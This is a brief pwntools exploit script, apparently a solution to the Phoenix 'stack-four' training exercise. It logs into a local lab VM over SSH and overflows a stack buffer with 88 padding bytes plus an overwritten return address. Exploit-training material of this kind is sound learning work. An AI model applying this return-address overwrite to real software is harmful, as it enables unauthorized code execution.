from pwn import *
shell = ssh("user", "localhost", password="user", port=2222)

s = b"a" * 88 + p64(0x40061d)
sh = shell.run(b"/opt/phoenix/amd64/stack-four")
sh.recvlines(1)
sh.sendline(s)
print(sh.recvlines(2))
